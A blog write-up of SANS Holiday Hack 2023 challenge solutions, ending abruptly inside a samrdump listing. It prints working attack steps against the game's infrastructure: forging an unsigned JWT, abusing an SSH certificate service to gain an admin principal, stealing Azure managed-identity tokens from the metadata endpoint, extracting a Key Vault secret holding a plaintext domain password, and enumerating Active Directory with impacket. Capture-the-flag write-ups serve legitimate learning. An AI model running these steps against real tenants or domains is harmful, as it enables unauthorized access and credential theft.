---
title: "Some SANS Holiday Hack 2023 Solutions"
date: 2024-01-10T12:29:17-08:00
draft: false
toc: true
comments: true
url: "/blog/sans-holiday-hack-2023/"
categories:
- Writeup
- Holiday Hack
---

As is tradition, I started the SANS Holiday Hack and this time I almost did
everything.

Previous years' writeups:
[/categories/holiday-hack/]({{< relref "/categories/holiday-hack/" >}}).

# Holiday Hack Orientation
Picked up the fishing pole.

Cranberry Pi: Type `answer`.

# Linux 101
> Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with
> some basic Linux tasks. It's in the southwest corner of Frosty's Beach.

You have to run a few commands to find the trolls.

```
ls
cat troll_19315479765589239
rm troll_19315479765589239
pwd
ls -alt
cat .bash_history
printenv
cd workshop
grep -ir "troll"
chmod +x present_engine 
./present_engine 
cd /home/elf/workshop/electrical
mv blown_fuse0 fuse0
ln -s fuse0 fuse1
cp fuse1 fuse2
echo "TROLL_REPELLENT" > fuse2
cd /opt/troll_den
find . -iname "*troll*"
find . -group troll
find . -size +108k -size -110k
ps -aux
netstat -napt
curl localhost:54321 # wget was not on the system
kill -9 6224 # process' pid
```

# Snowball Fight
> Visit Christmas Island and talk to Morcel Nougat about this great new game.
> Team up with another player and show Morcel how to win against Santa!

Might be able to use it in solo mode (by tinkerting client-side variables).

`gameType = "solo"` changes the snowball color but it was not right. The options
were `co-op` and `free-for-all`.

```
elfThrowDelay # 2000

playersHitBoxSize # maybe we can change it to all zeros
(4) [30, 30, 40, 60]

santaHitBoxSize = [200,200,200,200]
playersHitBoxSize = [1,1,1,1]

singlePlayer # change to true? - it's a string
'false'

santaThrowDelay # change it to higher
500

window.location.href

'https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&roomId=190d57f7f&roomType=private&gameType=co-op&id=...&dna=...&singlePlayer=false'

# the URL has gameType "co-op" and singlePlayer=false
# what if we changed it to gameType=solo and singlePlayer=true
# gameType=solo is wrong. I can only see `free-for-all` and `co-op` in code.

# the ball color changes and the page reloads but no enemies show up
# maybe we have to modify roomType
```

All the variables are set in the page's JavaScript.

`gameType=co-op&singlePlayer=true`

makes "elf the dwarf" join the game. This is probably what `elfThrowDelay` means

https://hhc23-snowball.holidayhackchallenge.com/room/?username=parsiya&roomId=891de62b&roomType=private&gameType=co-op&id=...&dna=...&singlePlayer=true

We have to wait a bit for the game to start.
And then kill Santa.

----------

Had to go and talk to Santa again. I missed it because he would start from
scratch. He said to go to a different place but doesn't tell you where.

I had to go right for a moderate amount of time to get to Rudloph's Rest. Seems
like Santa doesn't send you there. You have to use the bottom-left minimap to
navigate the waters.

# Reportinator
> Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and
> help him clean it up.

Just go through them and figure out which ones are LLM hallucinations. These are
usually big errors. For example, `HTTP SEND`, `HTTP 7.4.33`, port `88555/TCP`.

# Azure 101
> Help Sparkle Redberry with some Azure command line skills. Find the elf and
> the terminal on Christmas Island.

Reference index: https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest

```json
az help | less

az account show | less
{
  "environmentName": "AzureCloud",
  "id": "2b0942f3-9bca-484b-a508-abdae2db5e64",
  "isDefault": true,
  "name": "northpole-sub",
  "state": "Enabled",
  "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
  "user": {
    "name": "northpole@northpole.invalid",
    "type": "user"
  }
}

az group list
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
    "location": "eastus",
    "managedBy": null,
    "name": "northpole-rg1",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  },
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2",
    "location": "westus",
    "managedBy": null,
    "name": "northpole-rg2",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  }
]

az functionapp list -g northpole-rg1 | less
// too big to list

az vm list -g northpole-rg1
// no access

az vm list -g northpole-rg2
// works
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1",
    "location": "eastus",
    "name": "NP-VM1",
    "properties": {
      "hardwareProfile": {
        "vmSize": "Standard_D2s_v3"
      },
      "provisioningState": "Succeeded",
      "storageProfile": {
        "imageReference": {
          "offer": "UbuntuServer",
          "publisher": "Canonical",
          "sku": "16.04-LTS",
          "version": "latest"
        },
        "osDisk": {
          "caching": "ReadWrite",
          "createOption": "FromImage",
          "managedDisk": {
            "storageAccountType": "Standard_LRS"
          },
          "name": "VM1_OsDisk_1"
        }
      },
      "vmId": "e5f16214-18be-4a31-9ebb-2be3a55cfcf7"
    },
    "resourceGroup": "northpole-rg2",
    "tags": {}
  }
]

az vm run-command list -g northpole-rg2 -n NP-VM1
// returned the same output as above

az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts "ls"

{
  "value": [
    {
      "code": "ComponentStatus/StdOut/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "bin\netc\nhome\njinglebells\nlib\nlib64\nusr\n",
      "time": 1702263948
    },
    {
      "code": "ComponentStatus/StdErr/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "",
      "time": 1702263948
    }
  ]
}
```

One of the hints after finishing the challenge is this URL (it's supposedly
interesting). It shows a web portal where we can paste an SSH public key and get
an SSH certificate.

https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Also a link and hint to Azure REST APIs if cli is not available:
https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token


# Certificate SSHenanigans
> Go to Pixel Island and review Alabaster Snowball's new SSH certificate
> configuration and Azure Function App. What type of cookie cache is Alabaster
> planning to implement?


Function App: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Pixel Island is in the top right. We go there and see `Rainmaster Cliffs`.

> I could use your help with my fancy new Azure server at
> ssh-server-vm.santaworkshopgeeseislands.org.
>
> It even generated ready-to-deploy code for an Azure Function App so elves can
> request their own certificates. What a timesaver!
>
> Generate yourself a certificate and use the monitor account to access the
> host. See if you can grab my TODO list.
>
> Oh, and if you need to peek at the Function App code, there's a handy Azure
> REST API endpoint which will give you details  about how the Function App is
> deployed.
>

Important notes:

* Use the `monitor` account.
* Create a certificate and upload the public key to the portal so you can use it to SSH?
* Where does Azure REST APIs come into play?

```json
// generate a key
ssh-keygen -C "monitor" -f monitor

// we will get two files monitor and monitor.pub

// use the public key to get a signed cert

{
    "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com [removed]",
    "principal": "elf"
}

// rename the old public key
mv monitor.pub monitor.old

// use the signed cert from the server as the new public key, paste it in monitor.pub

// login as monitor - note we're passing the private key here
ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i monitor
```

We will see a `Satellite Tracking Interface`. Press `ctrl+c` to go into a CLI.
It's run via `~/.bashrc`.

```
# Start SatTrackr
/usr/local/bin/sattrackr
```

This is where we have to use curl and get info through the Azure REST API.
 
We need a token that we can get using this
https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token

GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true

Shouldn't change the resource.

```json
$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"\
    -H "Metadata: true"

{
  "access_token": "[removed]",
  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
  "expires_in": "85606",
  "expires_on": "1702417629",
  "ext_expires_in": "86399",
  "not_before": "1702330929",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

We have an access token. We can pass it in curl to get the code for the app.
Instead of passing it every time, we put it in a curl config file like this:

```bash
# cfg
-H "Authorization: bearer [token from above]"
```

Then pass the config file with `--config cfg`.

----------

**Use the Function App to get his TODO list.**

This is to get the source code. We need to figure out the placeholders.

GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01

https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl

Now we need three placeholders:

* `name` is probably `northpole-ssh-certs-fa`
* `subscriptionId`: TBD.
* `resourceGroupName`: TBD.

GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01

## List all subscriptions
`GET https://management.azure.com/subscriptions?api-version=2022-12-01`

https://learn.microsoft.com/en-us/rest/api/resources/subscriptions/list?view=rest-resources-2022-12-01&tabs=HTTP

```json
curl "https://management.azure.com/subscriptions?api-version=2022-12-01" --config cfg

// 2b0942f3-9bca-484b-a508-abdae2db5e64

{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
      "authorizationSource": "RoleBased",
      "managedByTenants": [],
      "tags": {
        "sans:application_owner": "SANS:R&D",
        "finance:business_unit": "curriculum"
      },
      "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "displayName": "sans-hhc",
      "state": "Enabled",
      "subscriptionPolicies": {
        "locationPlacementId": "Public_2014-09-01",
        "quotaId": "EnterpriseAgreement_2014-09-01",
        "spendingLimit": "Off"
      }
    }
  ],
  "count": {
    "type": "Total",
    "value": 1
  }
}
```

## List all Resource Groups
GET https://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01

https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01

```json
curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2021-04-01" --config cfg

// northpole-rg1

{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
      "name": "northpole-rg1",
      "type": "Microsoft.Resources/resourceGroups",
      "location": "eastus",
      "tags": {},
      "properties": {
        "provisioningState": "Succeeded"
      }
    }
  ]
}
```

## Red Herring - GitHub Repo
I went through a red herring and got the source code for the SSH app
(`northpole-ssh-certs-fa`)

```json
curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01"
    --config cfg

{
  // removed
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    // removed
  }
}
```

Let's go here which is available publicly:
https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa

There is no TODO list here. We need to list all the function apps here and find
the TODO app's name to get its source code.

## Red Herring 2 - Login as Alabaster
I saw that `alabaster` is the 2nd user on the machine. I tried to create a cert
for `alabaster` and login and it didn't work. We can only login as `monitor`.

Then I looked at the source code of the application and saw we can have a 2nd
JSON key named `principal`.

```py
def parse_input(data) -> Tuple[PublicKey, str]:
    """Parse and validate input parameters."""
    # removed

    principal = data.get("principal", DEFAULT_PRINCIPAL)
    # removed
    principal = principal.strip()
    # removed
    try:
        return PublicKey.from_string(ssh_pub_key), principal
    except ValueError as err:
        raise ValidationError("ssh_pub_key is not a valid SSH public key.") from err
```

It's used in `create_cert` which is done with a POST request.

```py
@app.route(route="create-cert", methods=['GET', 'POST'])
def create_cert(req: func.HttpRequest) -> func.HttpResponse:
    """Create SSH certificate."""
    # removed
    ssh_pub_key, principal = parse_input(req.get_json())

    cert_fields = CertificateFields(
        serial=1,
        key_id=str(uuid.uuid4()),
        valid_after=datetime.utcnow() - timedelta(minutes=5),
        valid_before=datetime.utcnow() + timedelta(days=28),
        principals=[principal],
        critical_options=[],
        extensions=[
            "permit-pty"
        ]
    )

    # removed
    ssh_cert = SSHCertificate.create(
        subject_pubkey=ssh_pub_key,
        ca_privkey=ca_ssh_priv_key,
        fields=cert_fields,
    )

    ssh_cert.sign()
    logging.info("SSH signed certificate: %s", ssh_cert.to_string())

    return func.HttpResponse(
        json.dumps({"ssh_cert": ssh_cert.to_string(), "principal": principal}),
        mimetype="application/json",
        status_code=200
    )
    #  removed
```

So I created a new key pair for `alabaster`. Opened the DevTools and signed it
normally. Then right-click and copy as cURL command and then modified the
payload.

So the new payload was:

```json
{
    "ssh_pub_key": "ssh-rsa [removed] alabaster",
    "principal": "alabaster"
}
```

And it didn't work. Mainly because I had not realized `principal` and `username`
are different. So I had to login as monitor and look at the sshd configuration
to figure out what principal is used server-side.

It's in `/etc/ssh/auth_principals` and we have two files there:

```
$ ls /etc/ssh/auth_principals/
alabaster  monitor`
$ cat monitor
elf
$ cat alabaster
admin
```

So we need to use the principal `admin`.

```json
{
    "ssh_pub_key": "ssh-rsa [removed] alabaster",
    "principal": "admin"
}
```

```json
$ curl 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' \
  -H 'authority: northpole-ssh-certs-fa.azurewebsites.net' \
  -H 'accept: */*' \
  -H 'content-type: application/json' \
  -H 'origin: https://northpole-ssh-certs-fa.azurewebsites.net' \
  -H 'referer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' \
  --data-raw '{"ssh_pub_key":"ssh-rsa [token] alabaster","principal":"admin"}' \
  --compressed
```

The result had this:

```json
{
    "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com [removed] ",
    "principal": "admin"
}
```

Now, we can login as `alabaster`.

```
ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i alabaster

$ ls
alabaster_todo.md  impacket

$ cat alabaster_todo.md
# Geese Islands IT & Security Todo List

[removed the rest of the list]

- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism
  to speed up data retrieval times. Don't let Santa eat the cache!
```

The answer is `Gingerbread`.

Hints from alabaster

> While we're on the topic of certificates, did you know Active Directory (AD)
> uses them as well? Apparently the service used to manage them can have
> misconfigurations too.

And there's a satellite above the islands.

# Elf Hunt
> Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75
> points.

Unlock the mysteries of JWTs with insights from
[PortSwigger's JWT Guide](https://portswigger.net/web-security/jwt).

Elves are too fast to hit, probably something in the cookies/headers/JWT.

The original request has a cookie named `ElfHunt_JWT` (I am just gonna put the
decoded values here).

```json
{"alg":"none","typ":"JWT"}
{"speed": -500}
```

The override must happen on `main.js` which is the file that decodes the JWT and
sets up the game. So we can just [modify the cookie value][c-c] in Chrome at
`Applications > Storage > Cookies > https://elfhunt.org` to
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6MH0.`.

[c-c]: https://developer.chrome.com/docs/devtools/application/cookies

Changing to `{"speed":0}` and reloading the page. This makes nothing happen. We
have to something low like `{"speed":-50}` (+10 didn't work either, maybe it
makes them fly the other way?).

So I changed the speed to `-50`, reload the page and click the game again.
Scored 75 points and it showed me a diary page.

According to Piney, his comms office is somewhere else. It might come in handy
there.

> What have you found there? The Captain's Journal? Yeah, he comes around a lot.
> You can find his comms office over at Brass Buoy Port on Steampunk Island.

Link to captain's journal: https://elfhunt.org/static/images/captainsJournal.png

The only important thing is the name of the admin role:
`GeeseIslandsSuperChiefCommunicationsOfficer`.

# Active Directory
> Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD
> environment. What's the name of the secret file in the inaccessible folder on
> the FileShare?

Off to Steampunk Island we go.

**Ribb Bonbowford**:

> I'm worried because our Active Directory server is hosted there and Wombley
> Cube's research department uses one of its fileshares to store their sensitive
> files.

From hints:

> It looks like Alabaster's SSH account has a couple of tools installed which
> might prove useful.
>
> Certificates are everywhere. Did you know Active Directory (AD) uses
> certificates as well? Apparently the service used to manage them can have
> misconfigurations too.

Login back to the account. We see `impacket`. But where do we start?

Let's get info from Azure metadata service.

```json
curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

{
  "compute": {
    "azEnvironment": "AzurePublicCloud",
    "customData": "",
    "evictionPolicy": "",
    "isHostCompatibilityLayerVm": "false",
    "licenseType": "",
    "location": "eastus",
    "name": "ssh-server-vm",
    "offer": "",
    "osProfile": {
      "adminUsername": "",
      "computerName": "",
      "disablePasswordAuthentication": ""
    },
    "osType": "Linux",
    "placementGroupId": "",
    "plan": {
      "name": "",
      "product": "",
      "publisher": ""
    },
    "platformFaultDomain": "0",
    "platformUpdateDomain": "0",
    "priority": "",
    "provider": "Microsoft.Compute",
    "publicKeys": [],
    "publisher": "",
    "resourceGroupName": "northpole-rg1",
    "resourceId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm",
    "securityProfile": {
      "secureBootEnabled": "false",
      "virtualTpmEnabled": "false"
    },
    "sku": "",
    "storageProfile": {
      "dataDisks": [],
      "imageReference": {
        "id": "",
        "offer": "",
        "publisher": "",
        "sku": "",
        "version": ""
      },
      "osDisk": {
        "caching": "ReadWrite",
        "createOption": "Attach",
        "diffDiskSettings": {
          "option": ""
        },
        "diskSizeGB": "30",
        "encryptionSettings": {
          "enabled": "false"
        },
        "image": {
          "uri": ""
        },
        "managedDisk": {
          "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/disks/ssh-server-vm_os_disk",
          "storageAccountType": "Standard_LRS"
        },
        "name": "ssh-server-vm_os_disk",
        "osType": "Linux",
        "vhd": {
          "uri": ""
        },
        "writeAcceleratorEnabled": "false"
      },
      "resourceDisk": {
        "size": "63488"
      }
    },
    "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
    "tags": "Project:HHC23",
    "tagsList": [
      {
        "name": "Project",
        "value": "HHC23"
      }
    ],
    "userData": "",
    "version": "",
    "vmId": "1f943876-80c5-4fc2-9a77-9011b0096c78",
    "vmScaleSetName": "",
    "vmSize": "Standard_B4ms",
    "zone": ""
  },
  "network": {
    "interface": [
      {
        "ipv4": {
          "ipAddress": [
            {
              "privateIpAddress": "10.0.0.50",
              "publicIpAddress": ""
            }
          ],
          "subnet": [
            {
              "address": "10.0.0.0",
              "prefix": "24"
            }
          ]
        },
        "ipv6": {
          "ipAddress": []
        },
        "macAddress": "6045BDFE2D67"
      }
    ]
  }
}
```

We have to get a different token to talk to AD.

```
// Get the token:
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.net' \
    -H Metadata:true > nem.txt

// Put it in the cURL config file like we saw before.
curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" \
    -K cfg2 
```

To get the result:

```json
{
  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-10-30T13:17:02.532Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-10-30T13:17:02.532Z"
      },
      "properties": {
        "sku": {
          "family": "A",
          "name": "Standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [],
        "enabledForDeployment": false,
        "enabledForDiskEncryption": false,
        "enabledForTemplateDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "enableRbacAuthorization": true,
        "vaultUri": "https://northpole-it-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-11-12T01:47:13.059Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-11-12T01:50:52.742Z"
      },
      "properties": {
        "sku": {
          "family": "A",
          "name": "standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [
          {
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "objectId": "0bc7ae9d-292d-4742-8830-68d12469d759",
            "permissions": {
              "keys": [
                "all"
              ],
              "secrets": [
                "all"
              ],
              "certificates": [
                "all"
              ],
              "storage": [
                "all"
              ]
            }
          },
          {
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "objectId": "1b202351-8c85-46f1-81f8-5528e92eb7ce",
            "permissions": {
              "secrets": [
                "get"
              ]
            }
          }
        ],
        "enabledForDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "vaultUri": "https://northpole-ssh-certs-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    }
  ],
  "nextLink": "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&$skiptoken=bm9ydGhwb2xlLXNzaC1jZXJ0cy1rdg=="
}
```

Not useful. Let's get a token for `vault.azure.net`.

```
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' \
    -H Metadata:true > cfg3

curl -K cfg3 "https://northpole-ssh-certs-kv.vault.azure.net/secrets?api-version=7.4"

// no access
```

Let's try a different API call.

```json
curl -K cfg3 "https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4"

{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

Cool, get the secret.

```json
curl -K cfg3 "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/?api-version=7.4" | jq

{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

After unescaping with Cyberchef:

```powershell
Import-Module ActiveDirectory
$UserName = "elfy"
$UserDomain = "northpole.local"
$UserUPN = "$UserName@$UserDomain"
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force
$DCIP = "10.0.0.53"
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName
    -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

Now we have the domain controller's IP, username and password.

How do we find file shares?

```
// this should be run with a token for management

curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
    -K cfg-management 

{"value":[]}
```

Nothing, maybe we should try and see what's at `northpole.local`.

Now I remember that we have access to impacket so can use it to enumerate all
accessible shares.

```
smbclient.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# password has a / so we need to wrap it in single quotes.

$ smbclient.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL

# use FileShare
# ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt

# cd super_secret_research
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

# ls super_secret_research
[-] [Errno 2] No such file or directory: 'super_secret_research'

# cat todo.txt
1. Bake some cookies.
2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
3. Profit
```

Let's look at other shares. Most are inaccessible. NETLOGON is empty.

```
use IPC$
# ls
-rw-rw-rw-          3  Mon Jan  1 00:00:00 1601 InitShutdown
[removed]
```

NTLM info:

```
$ DumpNTLMInfo.py 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[+] SMBv1 Enabled   : False
[+] Prefered Dialect: SMB 3.0
[+] Server Security : SIGNING_ENABLED | SIGNING_REQUIRED
[+] Max Read Size   : 8.0 MB (8388608 bytes)
[+] Max Write Size  : 8.0 MB (8388608 bytes)
[+] Current Time    : 2023-12-13 07:33:32.812993+00:00
[+] Name            : npdc01
[+] Domain          : NORTHPOLE
[+] DNS Tree Name   : northpole.local
[+] DNS Domain Name : northpole.local
[+] DNS Host Name   : npdc01.northpole.local
[+] OS              : Windows NT 10.0 Build 20348
[+] Null Session    : False
```

Look at SIDs.

```
$ lookupsid.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.0.0.53
[*] StringBinding ncacn_np:10.0.0.53[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-797234457-4040996451-3763944187
498: NORTHPOLE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NORTHPOLE\alabaster (SidTypeUser)
501: NORTHPOLE\Guest (SidTypeUser)
502: NORTHPOLE\krbtgt (SidTypeUser)
512: NORTHPOLE\Domain Admins (SidTypeGroup)
513: NORTHPOLE\Domain Users (SidTypeGroup)
514: NORTHPOLE\Domain Guests (SidTypeGroup)
515: NORTHPOLE\Domain Computers (SidTypeGroup)
516: NORTHPOLE\Domain Controllers (SidTypeGroup)
517: NORTHPOLE\Cert Publishers (SidTypeAlias)
518: NORTHPOLE\Schema Admins (SidTypeGroup)
519: NORTHPOLE\Enterprise Admins (SidTypeGroup)
520: NORTHPOLE\Group Policy Creator Owners (SidTypeGroup)
521: NORTHPOLE\Read-only Domain Controllers (SidTypeGroup)
522: NORTHPOLE\Cloneable Domain Controllers (SidTypeGroup)
525: NORTHPOLE\Protected Users (SidTypeGroup)
526: NORTHPOLE\Key Admins (SidTypeGroup)
527: NORTHPOLE\Enterprise Key Admins (SidTypeGroup)
553: NORTHPOLE\RAS and IAS Servers (SidTypeAlias)
571: NORTHPOLE\Allowed RODC Password Replication Group (SidTypeAlias)
572: NORTHPOLE\Denied RODC Password Replication Group (SidTypeAlias)
1000: NORTHPOLE\npdc01$ (SidTypeUser)
1101: NORTHPOLE\DnsAdmins (SidTypeAlias)
1102: NORTHPOLE\DnsUpdateProxy (SidTypeGroup)
1103: NORTHPOLE\researchers (SidTypeGroup)
1104: NORTHPOLE\elfy (SidTypeUser)
1105: NORTHPOLE\wombleycube (SidTypeUser)
```

Bunch of more info:

```
$ samrdump.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.0.0.53
Found domain(s):
 . NORTHPOLE
 . Builtin
[*] Looking up users in domain NORTHPOLE
Found user: alabaster, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: elfy, uid = 1104
Found user: wombleycube, uid = 1105
alabaster (500)/FullName:
alabaster (500)/UserComment:
alabaster (500)/PrimaryGroupId: 513
alabaster (500)/BadPasswordCount: 0
alabaster (500)/LogonCount: 12
alabaster (500)/PasswordLastSet: 2023-12-13 01:10:31.560964
alabaster (500)/PasswordDoesNotExpire: False
alabaster (500)/AccountIsDisabled: False
alabaster (500)/ScriptPath:
[removed info for user Guest]
[removed info for user krbtgt]
elfy (1104)/FullName:
elfy (1104)/UserComment:
elfy (1104)/PrimaryGroupId: 513
elfy (1104)/BadPasswordCount: 0
elfy (1104)/LogonCount: 0
elfy (1104)/PasswordLastSet: 2023-12-13 01:19:38.018905
elfy (1104)/PasswordDoesNotExpire: True
elfy (1104)/AccountIsDisabled: False
elfy (1104)/ScriptPath:
wombleycube (1105)/FullName:
wombleycube (1105)/UserComment:
wombleycube (1105)/PrimaryGroupId: 513
wombleycube (1105)/BadPasswordCount: 0
wombleycube (1105)/LogonCount: 23
